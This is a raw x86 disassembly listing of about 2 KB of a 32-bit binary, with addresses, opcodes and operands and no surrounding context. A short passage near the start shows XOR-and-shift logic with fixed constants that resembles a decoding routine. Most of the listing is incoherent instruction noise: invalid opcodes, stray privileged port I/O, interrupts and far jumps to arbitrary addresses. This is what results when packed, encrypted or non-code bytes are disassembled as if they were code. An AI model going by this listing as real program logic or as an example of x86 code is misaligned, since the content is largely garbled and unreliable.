  407540:	adc    eax,0x87b54405
  407545:	pop    es
  407546:	aaa    
  407547:	jmp    0x5daf:0x2d5bda3c
  40754e:	imul   eax,DWORD PTR [eax],0x68
  407551:	mov    ds:0x1552e58a,eax
  407556:	jbe    0x407529
  407558:	rol    esp,0x13
  40755b:	int    0xbd
  40755d:	int3   
  40755e:	sub    al,0x6b
  407560:	mov    cl,BYTE PTR [esi-0x54]
  407563:	aam    0x1b
  407565:	iret   
  407566:	sbb    cl,BYTE PTR [edx+ebp*2]
  407569:	push   es
  40756a:	dec    ebp
  40756b:	nop
  40756c:	add    al,0x80
  40756e:	mov    DWORD PTR [ecx-0x78],ebp
  407571:	ja     0x4075ef
  407573:	test   eax,0x2de1a5f2
  407578:	in     al,0xa8
  40757a:	data16 into 
  40757c:	sub    DWORD PTR [esi],ecx
  40757e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757f:	jmp    0xfbf40520
  407584:	(bad)  [ebx-0x2aba4c6d]
  40758a:	mov    bl,BYTE PTR ds:0x4c90c427
  407590:	mov    ecx,DWORD PTR [ebx-0x53f04bb3]
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0xfd
  407613:	das    
  407614:	fistp  QWORD PTR [esi+0x17]
  407617:	jge    0x407631
  407619:	sbb    BYTE PTR [esi-0x10e7e7ee],bl
  40761f:	mov    DWORD PTR [ebx],esi
  407621:	stc    
  407622:	jae    0x407684
  407624:	repnz loopne 0x40767d
  407627:	stc    
  407628:	push   ss
  407629:	push   0xd4dad8a7
  40762e:	fs push ss
  407630:	and    BYTE PTR ds:0xe493b001,dh
  407636:	int3   
  407637:	mov    DWORD PTR [bp+si+0x7a],esi
  40763b:	mov    bl,0x7e
  40763d:	sbb    BYTE PTR gs:[esi-0x5f6d83f6],ah
  407644:	aaa    
  407645:	lds    esi,FWORD PTR [esi]
  407647:	mov    cl,0x5f
  407649:	cwde   
  40764a:	inc    ebx
  40764b:	add    DWORD PTR [esi],ebp
  40764d:	push   edx
  40764e:	jb     0x407616
  407650:	mov    ecx,0x291e6054
  407655:	dec    ecx
  407656:	pop    ebx
  407657:	lock (bad) 
  407659:	icebp  
  40765a:	push   ebx
  40765b:	xlat   BYTE PTR ds:[ebx]
  40765c:	lods   eax,DWORD PTR ds:[esi]
  40765d:	pop    esi
  40765e:	jp     0x407692
  407660:	les    ebx,FWORD PTR [edi+0x49]
  407663:	add    BYTE PTR [edi-0x68],bh
  407666:	or     BYTE PTR [ecx-0x215c3efc],ch
  40766c:	repz int 0x45
  40766f:	jb     0x40763c
  407671:	fld    TBYTE PTR [ebp+0x4bdbd9ba]
  407677:	lock sbb DWORD PTR ds:0xf7d47111,esi
  40767e:	clc    
  40767f:	imul   ecx,ebx,0x1a4f436
  407685:	popa   
  407686:	pop    es
  407687:	and    DWORD PTR [edi+eax*2+0x5a],edx
  40768b:	or     al,0xea
  40768d:	es xor bl,dl
  407690:	pop    es
  407691:	(bad)  
  407693:	jmp    0xc514:0x7e43b53f
  40769a:	cdq    
  40769b:	pop    eax
  40769c:	sub    BYTE PTR [esi-0x660660ad],ch
  4076a2:	cmp    DWORD PTR [eax+edx*1],edi
  4076a5:	aad    0xbe
  4076a7:	pop    ss
  4076a8:	inc    ebp
  4076a9:	dec    esp
  4076aa:	sub    eax,eax
  4076ac:	ds and al,0x10
  4076af:	add    al,0x9c
  4076b1:	xlat   BYTE PTR ds:[ebx]
  4076b2:	mov    WORD PTR ds:0x95926e1b,ds
  4076b8:	mov    esi,0xb9812e64
  4076bd:	out    dx,al
  4076be:	popa   
  4076bf:	aas    
  4076c0:	mov    ebp,0x3b6852de
  4076c5:	or     dh,dh
  4076c7:	inc    esi
  4076c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076c9:	push   cs
  4076ca:	rcr    edi,cl
  4076cc:	es inc ebx
  4076ce:	rol    BYTE PTR [edi+0x1d851853],0x7e
  4076d5:	lods   al,BYTE PTR ds:[esi]
  4076d6:	pushf  
  4076d7:	in     eax,0xbc
  4076d9:	mov    eax,0x3f3f8e75
  4076de:	and    cl,bh
  4076e0:	std    
  4076e1:	mov    bh,0xf
  4076e3:	out    dx,eax
  4076e4:	add    BYTE PTR [ebp+0x46],cl
  4076e7:	dec    edx
  4076e9:	dec    edi
  4076ea:	and    ch,BYTE PTR es:[eax]
  4076ed:	xchg   ebx,eax
  4076ee:	cwde   
  4076ef:	ss lock mov dl,0x4e
  4076f3:	jl     0x40770e
  4076f5:	push   es
  4076f6:	push   ss
  4076f7:	loope  0x407721
  4076f9:	adc    DWORD PTR [edx-0x455c511a],esi
  4076ff:	pop    ebp
  407700:	cmp    eax,0x5c9d63ab
  407705:	dec    edi
  407706:	and    eax,0x33f42174
  40770b:	rol    BYTE PTR ds:0xfc49d1e2,cl
  407711:	and    eax,0xffc83b97
  407716:	aas    
  407717:	xchg   edx,eax
  407718:	scas   al,BYTE PTR es:[edi]
  407719:	jle    0x40770c
  40771b:	sub    bl,al
  40771d:	sbb    ebp,edx
  40771f:	sbb    eax,0x899e6240
  407724:	out    dx,al
  407725:	ds rcl esi,1
  407728:	mov    dh,0x6f
  40772a:	cmp    DWORD PTR [eax],0xc8b25d13
  407730:	xchg   ebp,eax
  407731:	sbb    dl,bl
  407733:	mov    cs,WORD PTR [eax]
  407735:	mov    ebp,0xd1f63811
  40773a:	push   DWORD PTR [eax+ebp*8+0x5ec321cc]
  407741:	adc    ecx,DWORD PTR [ebp+0x770481aa]
  407747:	adc    cl,BYTE PTR [ebx+edx*1]
  40774a:	pop    ebp
  40774b:	push   eax
  40774c:	js     0x4076f1
  40774e:	inc    esi
  40774f:	mov    cs,WORD PTR [edx-0x74]
  407752:	lock mov al,0xf7
  407755:	fs mov edx,0x8be1de59
  40775b:	ja     0x407737
  40775d:	xlat   BYTE PTR ds:[ebx]
  40775e:	jb     0x407784
  407760:	jmp    0xd74067db
  407765:	idiv   BYTE PTR [esi]
  407767:	adc    edi,0x50
  40776a:	fcmove st,st(2)
  40776c:	lock mov ecx,0xbfc23f3f
  407772:	or     eax,0x6dc9f762
  407777:	into   
  407778:	out    0xb3,eax
  40777a:	sbb    al,0x2
  40777c:	cmp    BYTE PTR [ebx],0x5e
  40777f:	jge    0x40773e
  407781:	imul   edi,DWORD PTR [esi-0x66],0x28ecbd1a
  407788:	sar    BYTE PTR [edx],1
  40778a:	mov    ebp,0x8bfc8f54
  40778f:	mov    ch,0xfd
  407791:	dec    esi
  407792:	mov    BYTE PTR [edi+0x193c0578],dh
  407798:	test   BYTE PTR [edi],0xa6
  40779b:	mov    ch,0xde
  40779d:	xchg   ebp,eax
  40779e:	test   BYTE PTR [edi+eiz*1-0x6f79121d],cl
  4077a5:	push   0xc9bc8cac
  4077aa:	adc    ebp,DWORD PTR [edi]
  4077ac:	mov    dl,0x52
  4077ae:	int    0x42
  4077b0:	fild   QWORD PTR [ebx]
  4077b2:	push   ds
  4077b3:	nop
  4077b4:	sahf   
  4077b5:	cmc    
  4077b6:	pusha  
  4077b7:	outs   dx,BYTE PTR ds:[esi]
  4077b8:	repz jns 0x407817
  4077bb:	out    dx,al
  4077bc:	mov    bl,0xd9
  4077be:	push   cs
  4077bf:	sbb    eax,0x38d9a21b
  4077c4:	dec    esi
  4077c5:	mov    al,0x4a
  4077c7:	sbb    ecx,ebp
  4077c9:	and    ebx,ebx
  4077cb:	int    0x26
  4077cd:	ins    DWORD PTR es:[edi],dx
  4077ce:	out    0xc6,al
  4077d0:	dec    esp
  4077d1:	pop    ecx
  4077d2:	in     eax,0x99
  4077d4:	mov    al,BYTE PTR [ebx+0x25c3171]
  4077da:	sub    BYTE PTR [eax+0x52],al
  4077dd:	sbb    al,0xf9
  4077df:	jmp    0x6eb111fb
  4077e4:	retf   0x5673
  4077e7:	dec    ecx
  4077e8:	cld    
  4077e9:	leave  
  4077ea:	mov    eax,0x8be5cc32
  4077ef:	adc    esp,ebp
  4077f1:	cli    
  4077f2:	mov    edx,0xba9ec3aa
  4077f7:	push   es
  4077f8:	mov    bh,BYTE PTR [edx+0x56]
  4077fb:	shl    cl,0xea
  4077fe:	ins    BYTE PTR es:[edi],dx
  4077ff:	pusha  
  407800:	cmp    DWORD PTR [edi],edx
  407802:	neg    DWORD PTR [edi+0x33d94fff]
  407808:	xchg   esi,eax
  407809:	mov    bh,0x57
  40780b:	sub    DWORD PTR [ebp-0x7c],eax
  40780e:	retf   
  40780f:	sbb    al,0xef
  407811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407812:	fs (bad) 
  407814:	into   
  407815:	fst    DWORD PTR [ecx]
  407817:	loope  0x4077b4
  407819:	and    ch,BYTE PTR [eax]
  40781b:	jmp    0x27e276d0
  407820:	sti    
  407821:	dec    ecx
  407822:	jl     0x4077f6
  407824:	xcrypt-ecb (bad)
  407825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407826:	mov    DWORD PTR [edx-0x37d4782b],ecx
  40782c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40782d:	aas    
  40782e:	mov    al,0x8a
  407830:	cmc    
  407831:	mov    ebp,0xeec48126
  407836:	shl    BYTE PTR [ecx-0x56],1
  407839:	shl    DWORD PTR [ecx],1
  40783b:	jmp    0x3183:0x53c0adef
  407842:	adc    DWORD PTR ds:0x223cde31,ebx
  407848:	or     DWORD PTR [ebx+0x457b882],0x24
  40784f:	ficomp WORD PTR [esi+0x39]
  407852:	sti    
  407853:	sbb    al,0x60
  407855:	test   al,0xd6
  407857:	dec    eax
  407858:	mov    ch,0x91
  40785a:	aas    
  40785b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40785c:	add    DWORD PTR [ecx+0x751ecef4],ecx
  407862:	jo     0x40783d
  407864:	mov    cl,0x42
  407866:	test   al,0x4e
  407868:	loopne 0x4078bf
  40786a:	xchg   edi,eax
  40786b:	div    DWORD PTR [esi+esi*4]
  40786e:	inc    ebp
  40786f:	sub    BYTE PTR [edi],al
  407871:	repz addr16 jmp 0x4078e4
  407875:	pop    ss
  407876:	shl    BYTE PTR [ecx],0x5
  407879:	imul   ebx,DWORD PTR [eax+0x63],0x38
  40787d:	xchg   DWORD PTR [esi-0x37],ebx
  407880:	inc    esp
  407881:	and    DWORD PTR [edi-0x90d1d61],ecx
  407887:	inc    edx
  407888:	das    
  407889:	aas    
  40788a:	push   es
  40788b:	lock and al,0x6f
  40788e:	cwde   
  40788f:	xor    DWORD PTR [esi],ebp
  407891:	mov    ebp,0x6fd8f196
  407896:	push   edx
  407897:	lods   al,BYTE PTR ds:[esi]
  407898:	add    BYTE PTR [ebp+0x77],ah
  40789b:	pop    es
  40789c:	in     al,dx
  40789d:	cmp    DWORD PTR ds:0xe8e8b01,eax
  4078a3:	jne    0x407875
  4078a5:	mov    esi,0x39008445
  4078aa:	xchg   ebp,eax
  4078ab:	mov    esp,0x377b9fc3
  4078b0:	adc    BYTE PTR [edx-0x54c1a83a],bl
  4078b6:	lock xor cl,BYTE PTR [eax-0x6]
  4078ba:	push   ss
  4078bb:	fsub   st(4),st
  4078bd:	inc    esi
  4078be:	sbb    esi,eax
  4078c0:	add    eax,0x9202fd6c
  4078c5:	mov    ds:0x3bf2716a,al
  4078ca:	cld    
  4078cb:	fisttp DWORD PTR ds:0x631e06b0
  4078d1:	push   ebx
  4078d2:	sub    eax,0x5fbb82a2
  4078d7:	sub    BYTE PTR [esi+0x1a],0x82
  4078db:	int    0x39
  4078dd:	retf   
  4078de:	cmp    eax,0xa391b4ca
  4078e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078e4:	cmp    al,ch
  4078e6:	jg     0x4078b2
  4078e8:	sub    BYTE PTR [ebx+0x13],0x9c
  4078ec:	repnz push ss
  4078ee:	ror    BYTE PTR [ecx-0x25890cde],1
  4078f4:	ds aaa 
  4078f6:	sbb    eax,0xffaa68bf
  4078fb:	xchg   esp,eax
  4078fc:	xor    ecx,DWORD PTR [ecx+0x1f]
  4078ff:	out    0xfb,al
  407901:	stc    
  407902:	xlat   BYTE PTR ds:[ebx]
  407903:	dec    edx
  407904:	(bad)  
  407905:	test   BYTE PTR [eax+0x1306b7ad],al
  40790b:	test   eax,0xa38cae64
  407910:	and    ebp,DWORD PTR [edx+esi*8]
  407913:	sub    DWORD PTR [esi],edx
  407915:	shr    ebx,cl
  407917:	push   cs
  407918:	xchg   DWORD PTR [esi+0xe],eax
  40791b:	pop    edi
  40791c:	outs   dx,DWORD PTR ds:[esi]
  40791d:	out    dx,al
  40791e:	or     ebx,DWORD PTR [ecx-0x71418ba1]
  407924:	test   DWORD PTR [edi+0x42],eax
  407927:	in     eax,0x99
  407929:	mov    ebp,0xfb77f071
  40792e:	mov    esp,0x88e6a313
  407933:	lahf   
  407934:	pop    gs
  407936:	dec    esp
  407937:	jb     0x4079a0
  407939:	pop    edi
  40793a:	sbb    BYTE PTR [eax-0x45d94f26],al
  407940:	or     al,0xb7
  407942:	loopne 0x40799f
  407944:	cs ds adc al,0x2b
  407948:	mov    bh,0x3e
  40794a:	ja     0x4078f6
  40794c:	imul   edi,DWORD PTR [esi+0x1d],0xc296a4ce
  407953:	xchg   ebp,eax
  407954:	popf   
  407955:	std    
  407956:	sar    BYTE PTR [ecx+0xd896198],0xb0
  40795d:	mov    ecx,0x2a87fc96
  407962:	push   ebp
  407963:	stos   BYTE PTR es:[edi],al
  407964:	dec    edx
  407965:	fsubr  QWORD PTR [ebp-0x5f154f30]
  40796b:	mov    eax,ds:0xc9463203
  407970:	xor    eax,esp
  407972:	sbb    ah,BYTE PTR [eax-0x40fd09c6]
  407978:	lods   eax,DWORD PTR ds:[esi]
  407979:	pushf  
  40797a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40797b:	and    al,bl
  40797d:	sub    al,BYTE PTR [ebx-0x8]
  407980:	dec    esp
  407981:	stos   BYTE PTR es:[edi],al
  407982:	retf   
  407983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407984:	mov    eax,0x6e8bc146
  407989:	push   esp
  40798a:	sbb    DWORD PTR [ebx+0x1a],ebx
  40798d:	out    0x3f,eax
  40798f:	sub    eax,0xf144b2f3
  407994:	cmc    
  407995:	xor    BYTE PTR [ebx+0x53d42791],al
  40799b:	fdiv   st,st(3)
  40799d:	xlat   BYTE PTR ds:[ebx]
  40799e:	inc    esp
  40799f:	inc    eax
  4079a0:	jl     0x407a21
  4079a2:	mov    eax,0x171d72a7
  4079a7:	inc    ebp
  4079a8:	es mov dl,0x11
  4079ab:	or     al,0x5c
  4079ad:	push   ds
  4079ae:	cwde   
  4079af:	into   
  4079b0:	pop    ds
  4079b1:	push   eax
  4079b2:	jge    0x4079d2
  4079b4:	cmp    ah,BYTE PTR ds:0x9f7b8695
  4079ba:	dec    ebp
  4079bb:	mov    bl,0x6c
  4079bd:	fs aas 
  4079bf:	lock mov ebp,0x819865ac
  4079c5:	push   edx
  4079c6:	enter  0x3d65,0xdd
  4079ca:	or     eax,0xd8ddc8f9
  4079cf:	cmc    
  4079d0:	mov    WORD PTR cs:0xf741882,ds
  4079d7:	addr16 lock out 0xf3,eax
  4079db:	jnp    0x407a20
  4079dd:	loop   0x4079f7
  4079df:	mov    DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x4079ba
  4079f4:	cmp    edi,DWORD PTR [edi]
  4079f6:	mov    esi,0x1818759d
  4079fb:	sahf   
  4079fc:	adc    bl,BYTE PTR [eax]
  4079fe:	sbb    BYTE PTR [eax],cl
  407a00:	fnstenv [edx+0x57e6a5f6]
  407a06:	pop    es
  407a07:	aas    
  407a08:	aas    
  407a09:	or     BYTE PTR [ebp+0x3413e333],al
  407a0f:	ins    DWORD PTR es:[edi],dx
  407a10:	lods   eax,DWORD PTR ds:[esi]
  407a11:	(bad)  [esi+0x45eff745]
  407a17:	out    dx,eax
  407a18:	aad    0x10
  407a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a1b:	clc    
  407a1c:	push   edi
  407a1d:	jnp    0x4079c2
  407a1f:	xlat   BYTE PTR ds:[ebx]
  407a20:	adc    ebp,DWORD PTR [eax]
  407a22:	dec    eax
  407a23:	mov    BYTE PTR [ecx-0x36],ah
  407a26:	cmp    DWORD PTR [esi+0x6e4960db],0xbc506dda
  407a30:	ror    BYTE PTR [eax-0x4a6bb79f],0x12
  407a37:	push   edi
  407a38:	inc    ebx
  407a39:	inc    ebx
  407a3a:	(bad)  
  407a3b:	test   dh,0xd7
  407a3e:	jns    0x4079ee
  407a40:	xchg   edx,eax
  407a41:	repnz pop es
  407a43:	retf   0x2f5e
  407a46:	(bad)  [edi-0x18878bbb]
  407a4c:	call   0xd781:0x919f8ec2
  407a53:	fnstenv [ebp-0x723f9260]
  407a59:	mov    al,0x5
  407a5b:	lods   eax,DWORD PTR ds:[esi]
  407a5c:	adc    al,0xc
  407a5e:	push   edi
  407a5f:	push   0x1d9b3108
  407a64:	mov    ebx,0x71c5d72
  407a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a6a:	sub    DWORD PTR ds:0x4d85a397,edx
  407a71:	ins    DWORD PTR es:[edi],dx
  407a72:	cmp    eax,0x7122e1e2
  407a77:	add    eax,0xa061b11
  407a7c:	loop   0x407a19
  407a7e:	sbb    bh,dh
  407a80:	aam    0x64
  407a82:	enter  0xcae0,0x2f
  407a86:	fild   QWORD PTR [eax+0x44b7b193]
  407a8c:	jb     0x407a74
  407a8e:	dec    ebx
  407a8f:	imul   esi,DWORD PTR [ebp+0x4b],0xffffff96
  407a93:	sbb    esp,edx
  407a95:	mov    eax,0x9bcea606
  407a9a:	fisubr WORD PTR [eax+eax*1-0x32beebe4]
  407aa1:	dec    ebx
  407aa2:	arpl   WORD PTR [eax-0x7],ax
  407aa5:	cmp    ah,ah
  407aa7:	inc    ebp
  407aa8:	push   eax
  407aa9:	mov    edx,0x764650b3
  407aae:	xlat   BYTE PTR ds:[ebx]
  407aaf:	xchg   DWORD PTR [edx-0x10602245],ebx
  407ab5:	shl    DWORD PTR [edi+0x74fb6646],1
  407abb:	aad    0x51
  407abd:	pop    edi
  407abe:	mov    eax,ds:0x27938442
  407ac3:	push   edi
  407ac4:	fisubr DWORD PTR [esi+0x4e]
  407ac7:	adc    eax,0xcaa5f987
  407acc:	mov    eax,ds:0xb7b0c08d
  407ad1:	into   
  407ad2:	cs push esp
  407ad4:	scas   eax,DWORD PTR es:[edi]
  407ad5:	dec    edi
  407ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad7:	aam    0x7c
  407ad9:	leave  
  407ada:	scas   eax,DWORD PTR es:[edi]
  407adb:	xchg   ecx,eax
  407adc:	add    bh,0x5b
  407adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae0:	ja     0x407b2f
  407ae2:	loope  0x407a8c
  407ae4:	xchg   esi,eax
  407ae5:	sbb    esi,DWORD PTR gs:[esi-0x65]
  407ae9:	loopne 0x407a9e
  407aeb:	push   edx
  407aec:	and    bh,BYTE PTR [ecx+0x65]
  407aef:	push   edi
  407af0:	js     0x407ab2
  407af2:	fcmovb st,st(4)
  407af4:	inc    edi
  407af5:	sti    
  407af6:	call   0x9e:0xcec42a5
  407afd:	ins    BYTE PTR es:[edi],dx
  407afe:	inc    ecx
  407aff:	cmp    DWORD PTR [eax+0x3],edx
  407b02:	push   ebx
  407b03:	fisttp WORD PTR [ebx+0x3d]
  407b06:	js     0x407abe
  407b08:	jp     0x407b0f
  407b0a:	leave  
  407b0b:	jmp    0x407aa0
  407b0d:	fwait
  407b0e:	sahf   
  407b0f:	jle    0x407adb
  407b11:	jmp    0x95a7:0xa38c1d38
  407b18:	lahf   
  407b19:	int    0x1d
  407b1b:	gs jg  0x407b3d
  407b1e:	add    BYTE PTR [ecx],0x19
  407b21:	ret    
  407b22:	ins    DWORD PTR es:[edi],dx
  407b23:	jl     0x407b75
  407b25:	lds    eax,FWORD PTR [eax+0x2a]
  407b28:	cli    
  407b29:	fmul   DWORD PTR [ebx-0x4f]
  407b2c:	sbb    al,0x60
  407b2e:	push   esp
  407b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b31:	sub    esi,DWORD PTR ds:0xc525481c
  407b37:	pop    ss
  407b38:	mov    al,ds:0xee597e18
  407b3d:	iret   
  407b3e:	test   BYTE PTR [ebx],dh
  407b40:	shl    ebp,cl
  407b42:	aas    
  407b43:	mov    edx,0xd5e215fe
  407b48:	cmp    DWORD PTR [ebx+0xe],edx
  407b4b:	in     al,dx
  407b4c:	ficomp WORD PTR [edi+edi*8-0x67a0750f]
  407b53:	jno    0x407b62
  407b55:	adc    BYTE PTR ds:0x6b26d5b,0xac
  407b5c:	mov    ds:0x73424b4f,al
  407b61:	retf   
  407b62:	pushf  
  407b63:	mov    ebx,DWORD PTR [esi]
  407b65:	mov    esp,0x3bbbd15c
  407b6a:	push   esi
  407b6b:	jg     0x407b49
  407b6d:	xchg   ecx,eax
  407b6e:	xor    ah,cl
  407b70:	or     ebp,DWORD PTR [edx+0x9]
  407b73:	xchg   esp,eax
  407b74:	and    dl,BYTE PTR [ebx+0x50532b3]
  407b7a:	loope  0x407bc3
  407b7c:	retf   0xa735
  407b7f:	inc    BYTE PTR [edx+ebx*8+0x5b]
  407b83:	cmp    edx,DWORD PTR [edx+0x3f]
  407b86:	jmp    0x495d:0x74f5c2da
  407b8d:	cmp    esp,DWORD PTR [edi]
  407b8f:	add    DWORD PTR [esp+ebx*4],0x936516ce
  407b96:	push   0xffffff8f
  407b98:	cs out 0x6d,al
  407b9b:	fsubr  st,st(5)
  407b9d:	adc    BYTE PTR [ebp-0x1b],ah
  407ba0:	fmul   DWORD PTR [esi-0x59]
  407ba3:	add    BYTE PTR [ebp+0x2202cc64],bl
  407ba9:	pop    ecx
  407baa:	or     dl,BYTE PTR [ebp-0x2d2fca02]
  407bb0:	(bad)  
  407bb1:	push   edx
  407bb2:	aam    0x42
  407bb4:	into   
  407bb5:	dec    ecx
  407bb6:	pop    ebx
  407bb7:	jbe    0x407b8a
  407bb9:	add    ebp,esp
  407bbb:	sub    eax,0xcbd6fd61
  407bc0:	push   ds
  407bc1:	jbe    0x407b5f
  407bc3:	ja     0x407b92
  407bc5:	mov    ch,ah
  407bc7:	loop   0x407bd3
  407bc9:	(bad)  
  407bca:	std    
  407bcb:	mov    eax,ds:0xd25bcbd1
  407bd0:	sub    BYTE PTR [ecx+ebp*1],dl
  407bd3:	pop    eax
  407bd4:	adc    eax,0x4a5b6e1f
  407bd9:	dec    ebp
  407bda:	arpl   WORD PTR [ebx+ecx*1+0x5966fa31],cx
  407be1:	dec    eax
  407be2:	aaa    
  407be3:	jo     0x407c2c
  407be5:	push   ebx
  407be6:	daa    
  407be7:	(bad)  
  407be8:	cmp    dl,BYTE PTR [ebx-0x68c892b7]
  407bee:	scas   al,BYTE PTR es:[edi]
  407bef:	jg     0x407b7c
  407bf1:	cmp    esp,DWORD PTR [esp+ebp*4]
  407bf4:	add    dl,0x24
  407bf7:	aam    0x6c
  407bf9:	push   edi
  407bfa:	hlt    
  407bfb:	add    DWORD PTR [esi+0x30f139a6],esp
  407c01:	js     0x407b85
  407c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c04:	jmp    0xe2bd91ce
  407c09:	ins    BYTE PTR es:[edi],dx
  407c0a:	call   0x6f47:0x311cf65b
  407c11:	inc    edx
  407c12:	js     0x407c06
  407c14:	lods   al,BYTE PTR ds:[esi]
  407c15:	push   eax
  407c16:	jmp    0x39cf:0xeb4c308b
  407c1d:	xor    DWORD PTR [eax],ebp
  407c1f:	and    dh,BYTE PTR [edi]
  407c21:	lds    ecx,FWORD PTR [edx+0x2d]
  407c24:	cmp    DWORD PTR [ebp-0x3bdc9e7b],esp
  407c2a:	es cs mov esi,0x5d235931
  407c31:	ficom  DWORD PTR [edx+0x7a1a7851]
  407c37:	mov    ds:0x833733f,eax
  407c3c:	mov    ebp,0xd275d393
  407c41:	scas   eax,DWORD PTR es:[edi]
  407c42:	mov    eax,ds:0xf9075bec
  407c47:	jns    0x407bdb
  407c49:	mov    eax,ds:0x652591b4
  407c4e:	fs and eax,0xb8cb55a1
  407c54:	jns    0x407c60
  407c56:	mov    bl,0x4b
  407c58:	out    dx,al
  407c59:	push   ds
  407c5a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c5c:	pusha  
  407c5d:	mov    ds:0xb201abda,al
  407c62:	ror    esi,1
  407c64:	sub    BYTE PTR [edi-0x4a],al
  407c67:	push   esi
  407c68:	mov    bl,0x5f
  407c6a:	pop    ebx
  407c6b:	addr16 pop ds
  407c6d:	add    BYTE PTR [edi],cl
  407c6f:	ins    BYTE PTR es:[edi],dx
  407c70:	adc    eax,0xf89dcf76
  407c75:	or     al,0x8e
  407c77:	cmp    al,BYTE PTR [edx+edi*1]
  407c7a:	cmp    BYTE PTR [ecx],bh
  407c7c:	jl     0x407c7f
  407c7e:	out    dx,al
  407c7f:	adc    BYTE PTR [eax-0x7],dh
  407c82:	ror    DWORD PTR [edi],1
  407c84:	test   eax,0x326f967
  407c89:	clc    
  407c8a:	imul   edi,DWORD PTR [eax-0x324f63ba],0x59
  407c91:	fucomi st,st(3)
  407c93:	fstp   DWORD PTR [eax-0x3f]
  407c96:	ins    DWORD PTR es:[edi],dx
  407c97:	xlat   BYTE PTR ds:[ebx]
  407c98:	in     al,0x79
  407c9a:	mov    al,ds:0x18ba9950
  407c9f:	mov    dl,0xeb
  407ca1:	hlt    
  407ca2:	inc    ebp
  407ca3:	call   0x48fab4e5
  407ca8:	push   ds
  407ca9:	jecxz  0x407ca8
  407cab:	ret    0x9d4b
  407cae:	lock xor al,0x36
  407cb1:	or     bh,BYTE PTR ds:[ecx]
  407cb4:	mov    ah,0x3
  407cb6:	out    0x8f,al
  407cb8:	lock test BYTE PTR [eax-0x7c],al
  407cbc:	hlt    
  407cbd:	dec    eax
  407cbe:	int3   
  407cbf:	data16 jnp 0x407c71
  407cc2:	enterw 0xcc0c,0xcb
  407cc7:	sub    eax,0xfc920f6d
  407ccc:	sub    ah,dh
  407cce:	and    DWORD PTR ds:0x8ca037fb,0xffffffe1
  407cd5:	les    esp,FWORD PTR [ebx-0x43]
  407cd8:	sbb    al,0xee
  407cda:	pop    ebp
  407cdb:	push   ebx
  407cdc:	or     eax,esp
  407cde:	or     DWORD PTR [edi+0x5c],0xf07652a4
  407ce5:	int    0xf4
  407ce7:	cmp    eax,0xbbd32ed8
  407cec:	ret    0x981d
  407cef:	jle    0x407cea
  407cf1:	push   cs
  407cf2:	call   0xe2a2b3a0
  407cf7:	inc    esp
  407cf8:	call   0x46ed:0x8c01d5d0
  407cff:	jecxz  0x407cc5
  407d01:	call   0xc113:0x48fdbe1f
  407d08:	add    edx,DWORD PTR fs:[edx+0x62]
  407d0c:	or     eax,0x233804f7
  407d11:	sub    eax,0xd89b72c4
  407d16:	jo     0x407d51
  407d18:	mov    eax,ds:0xaae07142
  407d1d:	add    DWORD PTR [edi+eiz*8],0x75
  407d21:	mov    BYTE PTR [ecx],al
  407d23:	mov    al,0x2e
  407d25:	xchg   ecx,esi
  407d27:	add    eax,0x197ac8ed
  407d2c:	out    dx,al
  407d2d:	jmp    FWORD PTR [edi-0x24]
  407d30:	ins    DWORD PTR es:[edi],dx
  407d31:	out    0x1,al
  407d33:	jmp    0x5397e259
  407d38:	pushf  
  407d39:	pop    edx
  407d3a:	lods   al,BYTE PTR ds:[esi]
  407d3b:	enter  0xecb5,0x1d
  407d3f:	sti    
  407d40:	pop    edi
  407d41:	mov    dl,0x90
  407d43:	jl     0x407d86
  407d45:	dec    ecx
  407d46:	popa   
